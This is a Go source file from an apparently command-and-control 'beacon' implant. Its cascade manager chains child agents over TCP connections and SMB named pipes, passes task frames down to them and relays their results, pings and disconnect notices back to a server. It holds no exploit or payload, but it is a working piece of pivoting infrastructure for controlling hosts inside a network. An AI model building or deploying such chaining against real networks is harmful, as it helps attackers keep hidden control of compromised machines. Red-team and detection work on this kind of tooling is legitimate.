package command

import (
	"beacon/pkg/cascade"
	"beacon/pkg/profile"
	"beacon/pkg/utils/packet"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	cascadeConnectTimeout = 10 * time.Second
)

type CascadeChannel struct {
	ChildID  string
	Protocol uint32
	Hint     string
	Link     cascade.Link
	writeMu  sync.Mutex
	closed   atomic.Bool
}

func (ch *CascadeChannel) Close() {
	if ch == nil {
		return
	}
	if ch.closed.CompareAndSwap(false, true) && ch.Link != nil {
		_ = ch.Link.Close()
	}
}

func (ch *CascadeChannel) writeFrame(cmd uint16, body []byte) error {
	ch.writeMu.Lock()
	defer ch.writeMu.Unlock()
	return cascade.WriteFrame(ch.Link, cmd, body)
}

type CascadeManager struct {
	mu      sync.RWMutex
	chans   map[string]*CascadeChannel
	pending [][]byte
}

func NewCascadeManager() *CascadeManager {
	return &CascadeManager{
		chans: make(map[string]*CascadeChannel),
	}
}

func (cm *CascadeManager) Close() {
	if cm == nil {
		return
	}

	cm.mu.Lock()
	channels := cm.chans
	cm.chans = make(map[string]*CascadeChannel)
	cm.pending = nil
	cm.mu.Unlock()

	for _, ch := range channels {
		ch.Close()
	}
}

// ShutdownAll 关闭所有级联子链路，并同步将 CascadeDead 写入 pending，
// 使调用方能在退出前将 Dead 通知刷给服务端。
// 与 Close 的区别：直接入队 Dead 包，不依赖 pumpChannel goroutine 异步触发。
func (cm *CascadeManager) ShutdownAll() {
	if cm == nil {
		return
	}

	cm.mu.Lock()
	channels := cm.chans
	cm.chans = make(map[string]*CascadeChannel)
	cm.mu.Unlock()

	for _, ch := range channels {
		// 先标记 closed，pumpChannel 收到读错误后会直接 return，不再重复 queueDead
		ch.Close()
		cm.queueDead(ch.ChildID, cascadeClosedReason(ch.Protocol))
	}
}

func (cm *CascadeManager) GetPendingPackets() [][]byte {
	if cm == nil {
		return nil
	}

	cm.mu.Lock()
	defer cm.mu.Unlock()
	if len(cm.pending) == 0 {
		return nil
	}
	out := append([][]byte(nil), cm.pending...)
	cm.pending = nil
	return out
}

func (cm *CascadeManager) ConnectTCP(p *packet.Parser) ([]byte, error) {
	if cm == nil {
		return nil, fmt.Errorf("cascade manager is not initialized")
	}

	argCount := p.ParseInt32()
	if p.HasError() {
		return nil, p.Error()
	}
	if argCount < 2 {
		return packet.PackArray([]any{[]byte("connect requires host and port")})
	}

	var childID string
	var host string
	var port int

	if argCount == 2 {
		host = strings.TrimSpace(p.ParseString())
		port = int(p.ParseInt32())
	} else {
		childID = strings.TrimSpace(p.ParseString())
		host = strings.TrimSpace(p.ParseString())
		port = int(p.ParseInt32())
	}
	if p.HasError() {
		return nil, p.Error()
	}
	if host == "" || port <= 0 {
		return packet.PackArray([]any{[]byte("invalid cascade tcp request")})
	}

	hint := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, fmt.Sprintf("%d", port)), tcpCascadeConnectTimeout())
	if err != nil {
		return packet.PackArray([]any{[]byte("tcp child connect failed")})
	}

	return cm.registerChannel(childID, cascade.ProtocolTCP, "tcp", hint, conn)
}

func (cm *CascadeManager) LinkSMB(p *packet.Parser) ([]byte, error) {
	if cm == nil {
		return nil, fmt.Errorf("cascade manager is not initialized")
	}

	argCount := p.ParseInt32()
	if p.HasError() {
		return nil, p.Error()
	}
	if argCount < 2 {
		return packet.PackArray([]any{[]byte("link requires child_id and pipe path")})
	}

	childID := strings.TrimSpace(p.ParseString())
	pipePath := strings.TrimSpace(p.ParseString())
	if p.HasError() {
		return nil, p.Error()
	}
	if pipePath == "" {
		return packet.PackArray([]any{[]byte("invalid cascade smb request")})
	}

	link, err := cascade.DialSMB(pipePath, smbCascadeConnectTimeout())
	if err != nil {
		return packet.PackArray([]any{[]byte("smb child link failed")})
	}

	return cm.registerChannel(childID, cascade.ProtocolSMB, "smb", pipePath, link)
}

func (cm *CascadeManager) registerChannel(childID string, protocol uint32, protocolName, hint string, link cascade.Link) ([]byte, error) {
	helloCmd, helloBody, err := cascade.ReadFrame(link)
	if err != nil {
		_ = link.Close()
		return packet.PackArray([]any{[]byte("cascade child did not send HELLO")})
	}
	if helloCmd != cascade.FrameHello {
		_ = link.Close()
		return packet.PackArray([]any{[]byte("cascade child did not send HELLO")})
	}

	realChildID, heartbeat, err := parseCascadeHello(helloBody)
	if err != nil {
		_ = link.Close()
		return packet.PackArray([]any{[]byte("cascade child HELLO parse failed")})
	}
	if realChildID != "" {
		childID = realChildID
	}
	if childID == "" {
		childID = hint
	}

	ch := &CascadeChannel{
		ChildID:  childID,
		Protocol: protocol,
		Hint:     hint,
		Link:     link,
	}

	cm.mu.Lock()
	if old := cm.chans[ch.ChildID]; old != nil {
		delete(cm.chans, ch.ChildID)
		old.Close()
	}
	cm.chans[ch.ChildID] = ch
	cm.mu.Unlock()

	cm.queueOpen(ch.ChildID, protocolName, ch.Hint, heartbeat)
	go cm.pumpChannel(ch)

	return packet.PackArray([]any{[]byte("cascade child connected")})
}

func (cm *CascadeManager) Route(p *packet.Parser) ([]byte, error) {
	if cm == nil {
		return nil, fmt.Errorf("cascade manager is not initialized")
	}

	childID := strings.TrimSpace(p.ParseString())
	blob := p.ParseBytes()
	if p.HasError() {
		return nil, p.Error()
	}
	if childID == "" {
		return packet.PackArray([]any{[]byte("invalid cascade route request")})
	}

	ch, ok := cm.get(childID)
	if !ok {
		return packet.PackArray([]any{[]byte("cascade child not found")})
	}

	if err := ch.writeFrame(cascade.FrameTask, blob); err != nil {
		cm.remove(childID)
		ch.Close()
		cm.queueDead(childID, "route write failed")
		return packet.PackArray([]any{[]byte("cascade route write failed")})
	}
	return packet.PackArray([]any{[]byte("cascade route sent")})
}

func (cm *CascadeManager) CloseChannel(p *packet.Parser) ([]byte, error) {
	if cm == nil {
		return nil, fmt.Errorf("cascade manager is not initialized")
	}

	childID := strings.TrimSpace(p.ParseString())
	if p.HasError() {
		return nil, p.Error()
	}
	if childID == "" {
		return packet.PackArray([]any{[]byte("invalid cascade close request")})
	}

	ch, ok := cm.remove(childID)
	if !ok {
		return packet.PackArray([]any{[]byte("cascade child not found")})
	}

	_ = ch.writeFrame(cascade.FrameClose, nil)
	ch.Close()
	return packet.PackArray([]any{[]byte("cascade child closed")})
}

func (cm *CascadeManager) get(childID string) (*CascadeChannel, bool) {
	cm.mu.RLock()
	defer cm.mu.RUnlock()
	ch, ok := cm.chans[childID]
	return ch, ok
}

func (cm *CascadeManager) remove(childID string) (*CascadeChannel, bool) {
	cm.mu.Lock()
	defer cm.mu.Unlock()
	ch, ok := cm.chans[childID]
	if ok {
		delete(cm.chans, childID)
	}
	return ch, ok
}

func (cm *CascadeManager) queueFinal(commandID uint32, payload []byte) {
	if cm == nil {
		return
	}
	cm.mu.Lock()
	defer cm.mu.Unlock()
	cm.pending = append(cm.pending, packet.MakeFinalPacket(0, commandID, payload))
}

func (cm *CascadeManager) queueOpen(childID, protocol, hint string, heartbeat []byte) {
	body, _ := packet.PackArray([]any{
		childID,
		protocol,
		hint,
		packet.PackBytes(heartbeat),
	})
	cm.queueFinal(CommandCascadeOpen, body)
}

func (cm *CascadeManager) queueRead(childID string, data []byte) {
	body, _ := packet.PackArray([]any{
		childID,
		packet.PackBytes(data),
	})
	cm.queueFinal(CommandCascadeRead, body)
}

func (cm *CascadeManager) queuePing(childID string, data []byte) {
	body, _ := packet.PackArray([]any{
		childID,
		packet.PackBytes(data),
	})
	cm.queueFinal(CommandCascadePing, body)
}

func (cm *CascadeManager) queueDead(childID, reason string) {
	body, _ := packet.PackArray([]any{
		childID,
		reason,
	})
	cm.queueFinal(CommandCascadeDead, body)
}

func (cm *CascadeManager) pumpChannel(ch *CascadeChannel) {
	for {
		cmd, body, err := cascade.ReadFrame(ch.Link)
		if err != nil {
			if ch.closed.Load() {
				return
			}
			cm.remove(ch.ChildID)
			ch.Close()
			cm.queueDead(ch.ChildID, cascadeClosedReason(ch.Protocol))
			return
		}

		switch cmd {
		case cascade.FrameResult:
			cm.queueRead(ch.ChildID, body)
		case cascade.FramePing:
			cm.queuePing(ch.ChildID, body)
		case cascade.FrameClose:
			cm.remove(ch.ChildID)
			ch.Close()
			return
		default:
		}
	}
}

func cascadeClosedReason(protocol uint32) string {
	if protocol == cascade.ProtocolSMB {
		return "pipe closed"
	}
	return "tcp closed"
}

func tcpCascadeConnectTimeout() time.Duration {
	return profileTimeout(profile.GlobalProfile.TCPInternal.ConnectTimeoutMS)
}

func smbCascadeConnectTimeout() time.Duration {
	return profileTimeout(profile.GlobalProfile.SMBInternal.ConnectTimeoutMS)
}

func profileTimeout(ms int) time.Duration {
	if ms <= 0 {
		return cascadeConnectTimeout
	}
	return time.Duration(ms) * time.Millisecond
}

func parseCascadeHello(body []byte) (string, []byte, error) {
	p := packet.CreateParser(body)
	childID := p.ParseString()
	heartbeat := p.ParseBytes()
	if p.HasError() {
		return "", nil, p.Error()
	}
	return childID, heartbeat, nil
}
